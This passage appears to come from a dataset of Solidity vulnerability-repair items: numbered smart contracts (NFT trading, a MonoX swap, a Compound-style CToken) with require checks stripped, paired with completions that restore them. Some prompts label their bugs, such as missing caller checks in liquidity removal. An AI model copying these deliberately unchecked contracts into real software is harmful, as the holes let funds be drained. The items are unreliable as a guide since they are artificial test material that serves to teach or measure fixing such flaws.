}\n\n250     //receiver helpers\n251     function deposit() public payable {}\n\n252     receive() external payable {}\n\n253     fallback() external payable {}\n\n254     function onERC1155Received(\n255         address,\n256         address from,\n257         uint256 id,\n258         uint256 amount,\n259         bytes calldata data\n260     ) external pure returns (bytes4) {\n261         return IERC1155Receiver.onERC1155Received.selector;\n262     }\n263 }",
        "completion": "24+   require(lockDev == false);\n46+        require(\n            msg.value >= (total).mul(buyNftFeeEth),\n            \"You need to pay ETH more\"\n        );\n47+   require(success, \"ETH Transfer failed.\");\n100+         require(\n                msg.value >= (total).mul(sellNftFeeEth).div(2),\n                \"You need to pay ETH more\"\n            );\n102+  require(\n                msg.value >= (total).mul(sellNftFeeEth),\n                \"You need to pay ETH more\"\n            );\n104+ require(success, \"ETH Transfer failed.\");\n140+   require(value > MIN, \"Dude tf\");\n143+   require(success, \"ETH Transfer failed.\");\n144+   require(success2, \"ETH Transfer failed.\");\n148+   require(msg.value > MIN, \"must trade over min\");\n148+   require(start, \"Not started!\");\n150+ require(success, \"ETH Transfer failed.\");"
    },
    {
        "prompt": "1 pragma solidity >=0.6.0 <0.8.0;\n\n2 import \"./openzeppelin/contracts/token/ERC1155/ERC1155.sol\";\n3 import \"./openzeppelin/contracts/token/ERC20/SafeERC20.sol\";\n4 import \"./openzeppelin/contracts/token/ERC20/IERC20.sol\";\n5 import \"./openzeppelin/contracts/math/SafeMath.sol\";\n6 import \"./openzeppelin/contracts-upgradeable/proxy/Initializable.sol\";\n7 import \"./openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol\";\n8 // import \"hardhat/consolse.sol\";\n9 import \"./libraries/IMonoXPool.sol\";\n10 import \"./libraries/IWETH.sol\";\n11 import \"./libraries/MonoXLibrary.sol\";\n\n12 //this contract is merely for annotation: it won't compile \n13   contract Monoswap{\n14 // view func for removing liquidity\n15   //bug: in this remove liquidity function, there's no check on msg.sender or to addresses,\n16   //it means that any address of msg.sender or to can remove the liquidity of a pool \n17   function _removeLiquidity (address _token, uint256 liquidity,\n18         address to) view public returns(\n19         uint256 poolValue, uint256 liquidityIn, uint256 vusdOut, uint256 tokenOut) {\n        \n20         uint256 tokenBalanceVusdValue;\n21         uint256 vusdCredit;\n22         uint256 vusdDebt;\n23         PoolInfo memory pool = pools[_token];\n24         (poolValue, tokenBalanceVusdValue, vusdCredit, vusdDebt) = getPool(_token);\n25         uint256 _totalSupply = monoXPool.totalSupplyOf(pool.pid);\n         \n26         liquidityIn = monoXPool.balanceOf(to, pool.pid)>liquidity?liquidity:monoXPool.balanceOf(to, pool.pid);\n27         uint256 tokenReserve = IERC20(_token).balanceOf(address(monoXPool));\n        \n28         if(tokenReserve < pool.tokenBalance){\n29           tokenBalanceVusdValue = tokenReserve.mul(pool.price)/1e18;\n30         }\n    \n31         if(vusdDebt>0){\n32           tokenReserve = (tokenBalanceVusdValue.sub(vusdDebt)).mul(1e18).div(pool.price);\n33         }\n    \n34         // if vusdCredit==0, vusdOut will be 0 as well\n35         vusdOut = liquidityIn.mul(vusdCredit).div(_totalSupply);\n    \n36         tokenOut = liquidityIn.mul(tokenReserve).div(_totalSupply);\n    \n37       }\n    \n38       function swapExactTokenForETH(\n39             address tokenIn,\n40             uint amountIn,\n41             uint amountOutMin,\n42             address to,\n43             uint deadline\n44           ) external virtual ensure(deadline) returns (uint amountOut) {\n45             IMonoXPool monoXPoolLocal = monoXPool;\n46             amountOut = swapIn(tokenIn, WETH, msg.sender, address(monoXPoolLocal), amountIn);\n47             require(amountOut >= amountOutMin, 'MonoX:INSUFF_OUTPUT');\n48             monoXPoolLocal.withdrawWETH(amountOut);\n49             monoXPoolLocal.safeTransferETH(to, amountOut);\n50           }\n    \n  \n51     function swapIn (address tokenIn, address tokenOut, address from, address to,\n52             uint256 amountIn) internal lockToken(tokenIn) returns(uint256 amountOut)  {\n      \n53           address monoXPoolLocal = address(monoXPool);\n      \n54           amountIn = transferAndCheck(from,monoXPoolLocal,tokenIn,amountIn); \n          \n55           // uint256 halfFeesInTokenIn = amountIn.mul(fees)/2e5;\n      \n56           uint256 tokenInPrice;\n57           uint256 tokenOutPrice;\n58           uint256 tradeVusdValue;\n          \n59           (tokenInPrice, tokenOutPrice, amountOut, tradeVusdValue) = getAmountOut(tokenIn, tokenOut, amountIn);\n      \n60           uint256 oneSideFeesInVusd = tokenInPrice.mul(amountIn.mul(fees)/2e5)/1e18;\n      \n61           // trading in\n62           if(tokenIn==address(vUSD)){\n63             vUSD.burn(monoXPoolLocal, amountIn);\n64             // all fees go to the other side\n65             oneSideFeesInVusd = oneSideFeesInVusd.mul(2);\n66           }else{\n67             //this is the buggy line \n68             _updateTokenInfo(tokenIn, tokenInPrice, 0, tradeVusdValue.add(oneSideFeesInVusd), 0);\n69           }\n      \n70           // trading out\n71           if(tokenOut==address(vUSD)){\n72             vUSD.mint(to, amountOut);\n73           }else{\n74             if (to != monoXPoolLocal) {\n75               IMonoXPool(monoXPoolLocal).safeTransferERC20Token(tokenOut, to, amountOut);\n76             }            \n77             _updateTokenInfo(tokenOut, tokenOutPrice, tradeVusdValue.add(oneSideFeesInVusd), 0, \n78               to == monoXPoolLocal ? amountOut : 0);\n79           }\n      \n80           emit Swap(to, tokenIn, tokenOut, amountIn, amountOut);\n          \n81         }\n\n82   }",
        "completion": "19+ require (liquidity>0, \"MonoX:BAD_AMOUNT\");\n76+ assert(to != address(0)); "
    },
    {
        "prompt": "1 pragma solidity ^0.5.16;\n\n2 import \"./ComptrollerInterface.sol\";\n3 import \"./CTokenInterfaces.sol\";\n4 import \"./ErrorReporter.sol\";\n5 import \"./Exponential.sol\";\n6 import \"./EIP20Interface.sol\";\n7 import \"./EIP20NonStandardInterface.sol\";\n8 import \"./InterestRateModel.sol\";\n\n9 contract CToken is CTokenInterface, Exponential, TokenErrorReporter {\n   \n10     function initialize(ComptrollerInterface comptroller_,\n11                         InterestRateModel interestRateModel_,\n12                         uint initialExchangeRateMantissa_,\n13                         string memory name_,\n14                         string memory symbol_,\n15                         uint8 decimals_) public {\n      \n16         // Set initial exchange rate\n17         initialExchangeRateMantissa = initialExchangeRateMantissa_;\n18         // Set the comptroller\n19         uint err = _setComptroller(comptroller_);\n       \n20         // Initialize block number and borrow index (block number mocks depend on comptroller being set)\n21         accrualBlockNumber = getBlockNumber();\n22         borrowIndex = mantissaOne;\n\n23         // Set the interest rate model (depends on block number / borrow index)\n24         err = _setInterestRateModelFresh(interestRateModel_);     \n25         name = name_;\n26         symbol = symbol_;\n27         decimals = decimals_;\n\n28         // The counter starts true to prevent changing it from zero to non-zero (i.e. smaller cost/refund)\n29         _notEntered = true;\n30     }\n\n   \n31     function transfer(address dst, uint256 amount) external nonReentrant returns (bool) {\n32         return transferTokens(msg.sender, msg.sender, dst, amount) == uint(Error.NO_ERROR);\n33     }\n\n  \n34     function transferFrom(address src, address dst, uint256 amount) external nonReentrant returns (bool) {\n35         return transferTokens(msg.sender, src, dst, amount) == uint(Error.NO_ERROR);\n36     }\n\n   \n37     function approve(address spender, uint256 amount) external returns (bool) {\n38         address src = msg.sender;\n39         transferAllowances[src][spender] = amount;\n40         emit Approval(src, spender, amount);\n41         return true;\n42     }\n\n43     function allowance(address owner, address spender) external view returns (uint256) {\n44         return transferAllowances[owner][spender];\n45     }\n\n46     function balanceOf(address owner) external view returns (uint256) {\n47         return accountTokens[owner];\n48     }\n\n \n49     function balanceOfUnderlying(address owner) external returns (uint) {\n50         Exp memory exchangeRate = Exp({mantissa: exchangeRateCurrent()});\n51         return mul_ScalarTruncate(exchangeRate, accountTokens[owner]);\n52     }\n\n\n53     function getAccountSnapshot(address account) external view returns (uint, uint, uint, uint) {\n54         uint cTokenBalance = getCTokenBalanceInternal(account);\n55         uint borrowBalance = borrowBalanceStoredInternal(account);\n56         uint exchangeRateMantissa = exchangeRateStoredInternal();\n\n57         return (uint(Error.NO_ERROR), cTokenBalance, borrowBalance, exchangeRateMantissa);\n58     }\n\n\n59     function getBlockNumber() internal view returns (uint) {\n60         return block.number;\n61     }\n\n\n62     function borrowRatePerBlock() external view returns (uint) {\n63         return interestRateModel.getBorrowRate(getCashPrior(), totalBorrows, totalReserves);\n64     }\n\n\n65     function supplyRatePerBlock() external view returns (uint) {\n66         return interestRateModel.getSupplyRate(getCashPrior(), totalBorrows, totalReserves, reserveFactorMantissa);\n67     }\n\n68     /**\n69      * @notice Returns the estimated per-block borrow interest rate for this cToken after some change\n70      * @return The borrow interest rate per block, scaled by 1e18\n71      */\n72     function estimateBorrowRatePerBlockAfterChange(uint256 change, bool repay) external view returns (uint) {\n73         uint256 cashPriorNew;\n74         uint256 totalBorrowsNew;\n\n75         if (repay) {\n76             cashPriorNew = add_(getCashPrior(), change);\n77             totalBorrowsNew = sub_(totalBorrows, change);\n78         } else {\n79             cashPriorNew = sub_(getCashPrior(), change);\n80             totalBorrowsNew = add_(totalBorrows, change);\n81         }\n82         return interestRateModel.getBorrowRate(cashPriorNew, totalBorrowsNew, totalReserves);\n83     }\n\n84     /**\n85      * @notice Returns the estimated per-block supply interest rate for this cToken after some change\n86      * @return The supply interest rate per block, scaled by 1e18\n87      */\n88     function estimateSupplyRatePerBlockAfterChange(uint256 change, bool repay) external view returns (uint) {\n89         uint256 cashPriorNew;\n90         uint256 totalBorrowsNew;\n\n91         if (repay) {\n92             cashPriorNew = add_(getCashPrior(), change);\n93             totalBorrowsNew = sub_(totalBorrows, change);\n94         } else {\n95             cashPriorNew = sub_(getCashPrior(), change);\n96             totalBorrowsNew = add_(totalBorrows, change);\n97         }\n\n98         return interestRateModel.getSupplyRate(cashPriorNew, totalBorrowsNew, totalReserves, reserveFactorMantissa);\n99     }\n\n100     /**\n101      * @notice Returns the current total borrows plus accrued interest\n102      * @return The total borrows with interest\n103      */\n104     function totalBorrowsCurrent() external nonReentrant returns (uint) {\n105         return totalBorrows;\n106     }\n\n\n107     function borrowBalanceCurrent(address account) external nonReentrant returns (uint) {\n      \n108         return borrowBalanceStored(account);\n109     }\n\n\n110     function borrowBalanceStored(address account) public view returns (uint) {\n111         return borrowBalanceStoredInternal(account);\n112     }\n\n\n113     function borrowBalanceStoredInternal(address account) internal view returns (uint) {\n114         /* Get borrowBalance and borrowIndex */\n115         BorrowSnapshot storage borrowSnapshot = accountBorrows[account];\n\n116         /* If borrowBalance = 0 then borrowIndex is likely also 0.\n117          * Rather than failing the calculation with a division by 0, we immediately return 0 in this case.\n118          */\n119         if (borrowSnapshot.principal == 0) {\n120             return 0;\n121         }\n\n122         /* Calculate new borrow balance using the interest index:\n123          *  recentBorrowBalance = borrower.borrowBalance * market.borrowIndex / borrower.borrowIndex\n124          */\n125         uint principalTimesIndex = mul_(borrowSnapshot.principal, borrowIndex);\n126         uint result = div_(principalTimesIndex, borrowSnapshot.interestIndex);\n127         return result;\n128     }\n\n129     /**\n130      * @notice Accrue interest then return the up-to-date exchange rate\n131      * @return Calculated exchange rate scaled by 1e18\n132      */\n133     function exchangeRateCurrent() public nonReentrant returns (uint) {\n134         return exchangeRateStored();\n135     }\n\n136     /**\n137      * @notice Calculates the exchange rate from the underlying to the CToken\n138      * @dev This function does not accrue interest before calculating the exchange rate\n139      * @return Calculated exchange rate scaled by 1e18\n140      */\n141     function exchangeRateStored() public view returns (uint) {\n142         return exchangeRateStoredInternal();\n143     }\n\n144     /**\n145      * @notice Calculates the exchange rate from the underlying to the CToken\n146      * @dev This function does not accrue interest before calculating the exchange rate\n147      * @return calculated exchange rate scaled by 1e18\n148      */\n149     function exchangeRateStoredInternal() internal view returns (uint) {\n150         uint _totalSupply = totalSupply;\n151         if (_totalSupply == 0) {\n152             /*\n153              * If there are no tokens minted:\n154              *  exchangeRate = initialExchangeRate\n155              */\n156             return initialExchangeRateMantissa;\n157         } else {\n158             /*\n159              * Otherwise:\n160              *  exchangeRate = (totalCash + totalBorrows - totalReserves) / totalSupply\n161              */\n162             uint totalCash = getCashPrior();\n163             uint cashPlusBorrowsMinusReserves = sub_(add_(totalCash, totalBorrows), totalReserves);\n164             uint exchangeRate = div_(cashPlusBorrowsMinusReserves, Exp({mantissa: _totalSupply}));\n165             return exchangeRate;\n166         }\n167     }\n\n168     /**\n169      * @notice Get cash balance of this cToken in the underlying asset\n170      * @return The quantity of underlying asset owned by this contract\n171      */\n172     function getCash() external view returns (uint) {\n173         return getCashPrior();\n174     }\n\n175     /**\n176      * @notice Applies accrued interest to total borrows and reserves\n177      * @dev This calculates interest accrued from the last checkpointed block\n178      *   up to the current block and writes new checkpoint to storage.\n179      */\n180     function accrueInterest() public returns (uint) {\n181         /* Remember the initial block number */\n182         uint currentBlockNumber = getBlockNumber();\n183         uint accrualBlockNumberPrior = accrualBlockNumber;\n\n184         /* Short-circuit accumulating 0 interest */\n185         if (accrualBlockNumberPrior == currentBlockNumber) {\n186             return uint(Error.NO_ERROR);\n187         }\n\n188         /* Read the previous values out of storage */\n189         uint cashPrior = getCashPrior();\n190         uint borrowsPrior = totalBorrows;\n191         uint reservesPrior = totalReserves;\n192         uint borrowIndexPrior = borrowIndex;\n\n193         /* Calculate the current borrow interest rate */\n194         uint borrowRateMantissa = interestRateModel.getBorrowRate(cashPrior, borrowsPrior, reservesPrior);\n\n\n195         /* Calculate the number of blocks elapsed since the last accrual */\n196         uint blockDelta = sub_(currentBlockNumber, accrualBlockNumberPrior);\n\n197         /*\n198          * Calculate the interest accumulated into borrows and reserves and the new index:\n199          *  simpleInterestFactor = borrowRate * blockDelta\n200          *  interestAccumulated = simpleInterestFactor * totalBorrows\n201          *  totalBorrowsNew = interestAccumulated + totalBorrows\n202          *  totalReservesNew = interestAccumulated * reserveFactor + totalReserves\n203          *  borrowIndexNew = simpleInterestFactor * borrowIndex + borrowIndex\n204          */\n\n205         Exp memory simpleInterestFactor = mul_(Exp({mantissa: borrowRateMantissa}), blockDelta);\n206         uint interestAccumulated = mul_ScalarTruncate(simpleInterestFactor, borrowsPrior);\n207         uint totalBorrowsNew = add_(interestAccumulated, borrowsPrior);\n208         uint totalReservesNew = mul_ScalarTruncateAddUInt(Exp({mantissa: reserveFactorMantissa}), interestAccumulated, reservesPrior);\n209         uint borrowIndexNew = mul_ScalarTruncateAddUInt(simpleInterestFactor, borrowIndexPrior, borrowIndexPrior);\n\n210         /////////////////////////\n211         // EFFECTS & INTERACTIONS\n212         // (No safe failures beyond this point)\n\n213         /* We write the previously calculated values into storage */\n214         accrualBlockNumber = currentBlockNumber;\n215         borrowIndex = borrowIndexNew;\n216         totalBorrows = totalBorrowsNew;\n217         totalReserves = totalReservesNew;\n\n218         /* We emit an AccrueInterest event */\n219         emit AccrueInterest(cashPrior, interestAccumulated, borrowIndexNew, totalBorrowsNew);\n\n220         return uint(Error.NO_ERROR);\n221     }\n\n222     /**\n223      * @notice Sender supplies assets into the market and receives cTokens in exchange\n224      * @dev Accrues interest whether or not the operation succeeds, unless reverted\n225      * @param mintAmount The amount of the underlying asset to supply\n226      * @return (uint, uint) An error code (0=success, otherwise a failure, see ErrorReporter.sol), and the actual mint amount.\n227      */\n228     function mintInternal(uint mintAmount) internal nonReentrant returns (uint, uint) {\n229         uint error = accrueInterest();\n230         if (error != uint(Error.NO_ERROR)) {\n231             // accrueInterest emits logs on errors, but we still want to log the fact that an attempted borrow failed\n232             return (fail(Error(error), FailureInfo.MINT_ACCRUE_INTEREST_FAILED), 0);\n233         }\n234         // mintFresh emits the actual Mint event if successful and logs on errors, so we don't need to\n235         return mintFresh(msg.sender, mintAmount);\n236     }\n\n237     /**\n238      * @notice Sender redeems cTokens in exchange for the underlying asset\n239      * @dev Accrues interest whether or not the operation succeeds, unless reverted\n240      * @param redeemTokens The number of cTokens to redeem into underlying\n241      * @return uint 0=success, otherwise a failure (see ErrorReporter.sol for details)\n242      */\n243     function redeemInternal(uint redeemTokens) internal nonReentrant returns (uint) {\n244         uint error = accrueInterest();\n245         if (error != uint(Error.NO_ERROR)) {\n246             // accrueInterest emits logs on errors, but we still want to log the fact that an attempted redeem failed\n247             return fail(Error(error), FailureInfo.REDEEM_ACCRUE_INTEREST_FAILED);\n248         }\n249         // redeemFresh emits redeem-specific logs on errors, so we don't need to\n250         return redeemFresh(msg.sender, redeemTokens, 0);\n251     }\n\n252     /**\n253      * @notice Sender redeems cTokens in exchange for a specified amount of underlying asset\n254      * @dev Accrues interest whether or not the operation succeeds, unless reverted\n255      * @param redeemAmount The amount of underlying to receive from redeeming cTokens\n256      * @return uint 0=success, otherwise a failure (see ErrorReporter.sol for details)\n257      */\n258     function redeemUnderlyingInternal(uint redeemAmount) internal nonReentrant returns (uint) {\n259         uint error = accrueInterest();\n260         if (error != uint(Error.NO_ERROR)) {\n261             // accrueInterest emits logs on errors, but we still want to log the fact that an attempted redeem failed\n262             return fail(Error(error), FailureInfo.REDEEM_ACCRUE_INTEREST_FAILED);\n263         }\n264         // redeemFresh emits redeem-specific logs on errors, so we don't need to\n265         return redeemFresh(msg.sender, 0, redeemAmount);\n266     }\n\n267     /**\n268       * @notice Sender borrows assets from the protocol to their own address\n269       * @param borrowAmount The amount of the underlying asset to borrow\n270       * @return uint 0=success, otherwise a failure (see ErrorReporter.sol for details)\n271       */\n272     function borrowInternal(uint borrowAmount) internal nonReentrant returns (uint) {\n273         uint error = accrueInterest();\n274         if (error != uint(Error.NO_ERROR)) {\n275             // accrueInterest emits logs on errors, but we still want to log the fact that an attempted borrow failed\n276             return fail(Error(error), FailureInfo.BORROW_ACCRUE_INTEREST_FAILED);\n277         }\n278         // borrowFresh emits borrow-specific logs on errors, so we don't need to\n279         return borrowFresh(msg.sender, borrowAmount);\n280     }\n\n281     struct BorrowLocalVars {\n282         MathError mathErr;\n283         uint accountBorrows;\n284         uint accountBorrowsNew;\n285         uint totalBorrowsNew;\n286     }\n\n287     /**\n288       * @notice Users borrow assets from the protocol to their own address\n289       * @param borrowAmount The amount of the underlying asset to borrow\n290       * @return uint 0=success, otherwise a failure (see ErrorReporter.sol for details)\n291       */\n292     function borrowFresh(address payable borrower, uint borrowAmount) internal returns (uint) {\n293         /* Fail if borrow not allowed */\n294         uint allowed = comptroller.borrowAllowed(address(this), borrower, borrowAmount);\n295         if (allowed != 0) {\n296             return failOpaque(Error.COMPTROLLER_REJECTION, FailureInfo.BORROW_COMPTROLLER_REJECTION, allowed);\n297         }\n\n298         /*\n299          * Return if borrowAmount is zero.\n300          * Put behind `borrowAllowed` for accuring potential COMP rewards.\n301          */\n302         if (borrowAmount == 0) {\n303             accountBorrows[borrower].interestIndex = borrowIndex;\n304             return uint(Error.NO_ERROR);\n305         }\n\n306         /* Verify market's block number equals current block number */\n307         if (accrualBlockNumber != getBlockNumber()) {\n308             return fail(Error.MARKET_NOT_FRESH, FailureInfo.BORROW_FRESHNESS_CHECK);\n309         }\n\n310         /* Fail gracefully if protocol has insufficient underlying cash */\n311         if (getCashPrior() < borrowAmount) {\n312             return fail(Error.TOKEN_INSUFFICIENT_CASH, FailureInfo.BORROW_CASH_NOT_AVAILABLE);\n313         }\n\n314         BorrowLocalVars memory vars;\n\n315         /*\n316          * We calculate the new borrower and total borrow balances, failing on overflow:\n317          *  accountBorrowsNew = accountBorrows + borrowAmount\n318          *  totalBorrowsNew = totalBorrows + borrowAmount\n319          */\n320         vars.accountBorrows = borrowBalanceStoredInternal(borrower);\n321         vars.accountBorrowsNew = add_(vars.accountBorrows, borrowAmount);\n322         vars.totalBorrowsNew = add_(totalBorrows, borrowAmount);\n\n323         /////////////////////////\n324         // EFFECTS & INTERACTIONS\n325         // (No safe failures beyond this point)\n\n326         /*\n327          * We invoke doTransferOut for the borrower and the borrowAmount.\n328          *  Note: The cToken must handle variations between ERC-20 and ETH underlying.\n329          *  On success, the cToken borrowAmount less of cash.\n330          *  doTransferOut reverts if anything goes wrong, since we can't be sure if side effects occurred.\n331          */\n332         doTransferOut(borrower, borrowAmount);\n\n333         /* We write the previously calculated values into storage */\n334         accountBorrows[borrower].principal = vars.accountBorrowsNew;\n335         accountBorrows[borrower].interestIndex = borrowIndex;\n336         totalBorrows = vars.totalBorrowsNew;\n\n337         /* We emit a Borrow event */\n338         emit Borrow(borrower, borrowAmount, vars.accountBorrowsNew, vars.totalBorrowsNew);\n\n339         /* We call the defense hook */\n340         // unused function\n341         // comptroller.borrowVerify(address(this), borrower, borrowAmount);\n\n342         return uint(Error.NO_ERROR);\n343     }\n\n344     /**\n345      * @notice Sender repays their own borrow\n346      * @param repayAmount The amount to repay\n347      * @return (uint, uint) An error code (0=success, otherwise a failure, see ErrorReporter.sol), and the actual repayment amount.\n348      */\n349     function repayBorrowInternal(uint repayAmount) internal nonReentrant returns (uint, uint) {\n350         uint error = accrueInterest();\n351         if (error != uint(Error.NO_ERROR)) {\n352             // accrueInterest emits logs on errors, but we still want to log the fact that an attempted borrow failed\n353             return (fail(Error(error), FailureInfo.REPAY_BORROW_ACCRUE_INTEREST_FAILED), 0);\n354         }\n355         // repayBorrowFresh emits repay-borrow-specific logs on errors, so we don't need to\n356         return repayBorrowFresh(msg.sender, msg.sender, repayAmount);\n357     }\n\n358     /**\n359      * @notice Sender repays a borrow belonging to borrower\n360      * @param borrower the account with the debt being payed off\n361      * @param repayAmount The amount to repay\n362      * @return (uint, uint) An error code (0=success, otherwise a failure, see ErrorReporter.sol), and the actual repayment amount.\n363      */\n364     function repayBorrowBehalfInternal(address borrower, uint repayAmount) internal nonReentrant returns (uint, uint) {\n365         uint error = accrueInterest();\n366         if (error != uint(Error.NO_ERROR)) {\n367             // accrueInterest emits logs on errors, but we still want to log the fact that an attempted borrow failed\n368             return (fail(Error(error), FailureInfo.REPAY_BEHALF_ACCRUE_INTEREST_FAILED), 0);\n369         }\n370         // repayBorrowFresh emits repay-borrow-specific logs on errors, so we don't need to\n371         return repayBorrowFresh(msg.sender, borrower, repayAmount);\n372     }\n\n373     struct RepayBorrowLocalVars {\n374         Error err;\n375         MathError mathErr;\n376         uint repayAmount;\n377         uint borrowerIndex;\n378         uint accountBorrows;\n379         uint accountBorrowsNew;\n380         uint totalBorrowsNew;\n381         uint actualRepayAmount;\n382     }\n\n383     /**\n384      * @notice Borrows are repaid by another user (possibly the borrower).\n385      * @param payer the account paying off the borrow\n386      * @param borrower the account with the debt being payed off\n387      * @param repayAmount the amount of undelrying tokens being returned\n388      * @return (uint, uint) An error code (0=success, otherwise a failure, see ErrorReporter.sol), and the actual repayment amount.\n389      */\n390     function repayBorrowFresh(address payer, address borrower, uint repayAmount) internal returns (uint, uint) {\n391         /* Fail if repayBorrow not allowed */\n392         uint allowed = comptroller.repayBorrowAllowed(address(this), payer, borrower, repayAmount);\n393         if (allowed != 0) {\n394             return (failOpaque(Error.COMPTROLLER_REJECTION, FailureInfo.REPAY_BORROW_COMPTROLLER_REJECTION, allowed), 0);\n395         }\n\n396         /*\n397          * Return if repayAmount is zero.\n398          * Put behind `repayBorrowAllowed` for accuring potential COMP rewards.\n399          */\n400         if (repayAmount == 0) {\n401             accountBorrows[borrower].interestIndex = borrowIndex;\n402             return (uint(Error.NO_ERROR), 0);\n403         }\n\n404         /* Verify market's block number equals current block number */\n405         if (accrualBlockNumber != getBlockNumber()) {\n406             return (fail(Error.MARKET_NOT_FRESH, FailureInfo.REPAY_BORROW_FRESHNESS_CHECK), 0);\n407         }\n\n408         RepayBorrowLocalVars memory vars;\n\n409         /* We remember the original borrowerIndex for verification purposes */\n410         vars.borrowerIndex = accountBorrows[borrower].interestIndex;\n\n411         /* We fetch the amount the borrower owes, with accumulated interest */\n412         vars.accountBorrows = borrowBalanceStoredInternal(borrower);\n\n413         /* If repayAmount == -1, repayAmount = accountBorrows */\n414         if (repayAmount == uint(-1)) {\n415             vars.repayAmount = vars.accountBorrows;\n416         } else {\n417             vars.repayAmount = repayAmount;\n418         }\n\n419         /////////////////////////\n420         // EFFECTS & INTERACTIONS\n421         // (No safe failures beyond this point)\n\n422         /*\n423          * We call doTransferIn for the payer and the repayAmount\n424          *  Note: The cToken must handle variations between ERC-20 and ETH underlying.\n425          *  On success, the cToken holds an additional repayAmount of cash.\n426          *  doTransferIn reverts if anything goes wrong, since we can't be sure if side effects occurred.\n427          *   it returns the amount actually transferred, in case of a fee.\n428          */\n429         vars.actualRepayAmount = doTransferIn(payer, vars.repayAmount);\n\n430         /*\n431          * We calculate the new borrower and total borrow balances, failing on underflow:\n432          *  accountBorrowsNew = accountBorrows - actualRepayAmount\n433          *  totalBorrowsNew = totalBorrows - actualRepayAmount\n434          */\n435         vars.accountBorrowsNew = sub_(vars.accountBorrows, vars.actualRepayAmount);\n436         vars.totalBorrowsNew = sub_(totalBorrows, vars.actualRepayAmount);\n\n437         /* We write the previously calculated values into storage */\n438         accountBorrows[borrower].principal = vars.accountBorrowsNew;\n439         accountBorrows[borrower].interestIndex = borrowIndex;\n440         totalBorrows = vars.totalBorrowsNew;\n\n441         /* We emit a RepayBorrow event */\n442         emit RepayBorrow(payer, borrower, vars.actualRepayAmount, vars.accountBorrowsNew, vars.totalBorrowsNew);\n\n443         /* We call the defense hook */\n444         // unused function\n445         // comptroller.repayBorrowVerify(address(this), payer, borrower, vars.actualRepayAmount, vars.borrowerIndex);\n\n446         return (uint(Error.NO_ERROR), vars.actualRepayAmount);\n447     }\n\n448     /**\n449      * @notice The sender liquidates the borrowers collateral.\n450      *  The collateral seized is transferred to the liquidator.\n451      * @param borrower The borrower of this cToken to be liquidated\n452      * @param cTokenCollateral The market in which to seize collateral from the borrower\n453      * @param repayAmount The amount of the underlying borrowed asset to repay\n454      * @return (uint, uint) An error code (0=success, otherwise a failure, see ErrorReporter.sol), and the actual repayment amount.\n455      */\n456     function liquidateBorrowInternal(address borrower, uint repayAmount, CTokenInterface cTokenCollateral) internal nonReentrant returns (uint, uint) {\n457         uint error = accrueInterest();\n458         if (error != uint(Error.NO_ERROR)) {\n459             // accrueInterest emits logs on errors, but we still want to log the fact that an attempted liquidation failed\n460             return (fail(Error(error), FailureInfo.LIQUIDATE_ACCRUE_BORROW_INTEREST_FAILED), 0);\n461         }\n\n462         error = cTokenCollateral.accrueInterest();\n463         if (error != uint(Error.NO_ERROR)) {\n464             // accrueInterest emits logs on errors, but we still want to log the fact that an attempted liquidation failed\n465             return (fail(Error(error), FailureInfo.LIQUIDATE_ACCRUE_COLLATERAL_INTEREST_FAILED), 0);\n466         }\n\n467         // liquidateBorrowFresh emits borrow-specific logs on errors, so we don't need to\n468         return liquidateBorrowFresh(msg.sender, borrower, repayAmount, cTokenCollateral);\n469     }\n\n470     /**\n471      * @notice The liquidator liquidates the borrowers collateral.\n472      *  The collateral seized is transferred to the liquidator.\n473      * @param borrower The borrower of this cToken to be liquidated\n474      * @param liquidator The address repaying the borrow and seizing collateral\n475      * @param cTokenCollateral The market in which to seize collateral from the borrower\n476      * @param repayAmount The amount of the underlying borrowed asset to repay\n477      * @return (uint, uint) An error code (0=success, otherwise a failure, see ErrorReporter.sol), and the actual repayment amount.\n478      */\n479     function liquidateBorrowFresh(address liquidator, address borrower, uint repayAmount, CTokenInterface cTokenCollateral) internal returns (uint, uint) {\n480         /* Fail if liquidate not allowed */\n481         uint allowed = comptroller.liquidateBorrowAllowed(address(this), address(cTokenCollateral), liquidator, borrower, repayAmount);\n482         if (allowed != 0) {\n483             return (failOpaque(Error.COMPTROLLER_REJECTION, FailureInfo.LIQUIDATE_COMPTROLLER_REJECTION, allowed), 0);\n484         }\n\n485         /* Verify market's block number equals current block number */\n486         if (accrualBlockNumber != getBlockNumber()) {\n487             return (fail(Error.MARKET_NOT_FRESH, FailureInfo.LIQUIDATE_FRESHNESS_CHECK), 0);\n488         }\n\n489         /* Verify cTokenCollateral market's block number equals current block number */\n490         if (cTokenCollateral.accrualBlockNumber() != getBlockNumber()) {\n491             return (fail(Error.MARKET_NOT_FRESH, FailureInfo.LIQUIDATE_COLLATERAL_FRESHNESS_CHECK), 0);\n492         }\n\n493         /* Fail if borrower = liquidator */\n494         if (borrower == liquidator) {\n495             return (fail(Error.INVALID_ACCOUNT_PAIR, FailureInfo.LIQUIDATE_LIQUIDATOR_IS_BORROWER), 0);\n496         }\n\n497         /* Fail if repayAmount = 0 */\n498         if (repayAmount == 0) {\n499             return (fail(Error.INVALID_CLOSE_AMOUNT_REQUESTED, FailureInfo.LIQUIDATE_CLOSE_AMOUNT_IS_ZERO), 0);\n500         }\n\n501         /* Fail if repayAmount = -1 */\n502         if (repayAmount == uint(-1)) {\n503             return (fail(Error.INVALID_CLOSE_AMOUNT_REQUESTED, FailureInfo.LIQUIDATE_CLOSE_AMOUNT_IS_UINT_MAX), 0);\n504         }\n\n\n505         /* Fail if repayBorrow fails */\n506         (uint repayBorrowError, uint actualRepayAmount) = repayBorrowFresh(liquidator, borrower, repayAmount);\n507         if (repayBorrowError != uint(Error.NO_ERROR)) {\n508             return (fail(Error(repayBorrowError), FailureInfo.LIQUIDATE_REPAY_BORROW_FRESH_FAILED), 0);\n509         }\n\n510         /////////////////////////\n511         // EFFECTS & INTERACTIONS\n512         // (No safe failures beyond this point)\n\n513         /* We calculate the number of collateral tokens that will be seized */\n514         (uint amountSeizeError, uint seizeTokens) = comptroller.liquidateCalculateSeizeTokens(address(this), address(cTokenCollateral), actualRepayAmount);\n515         require(amountSeizeError == uint(Error.NO_ERROR), \"LIQUIDATE_COMPTROLLER_CALCULATE_AMOUNT_SEIZE_FAILED\");\n\n516         /* Revert if borrower collateral token balance < seizeTokens */\n517         require(cTokenCollateral.balanceOf(borrower) >= seizeTokens, \"LIQUIDATE_SEIZE_TOO_MUCH\");\n\n518         // If this is also the collateral, run seizeInternal to avoid re-entrancy, otherwise make an external call\n519         uint seizeError;\n520         if (address(cTokenCollateral) == address(this)) {\n521             seizeError = seizeInternal(address(this), liquidator, borrower, 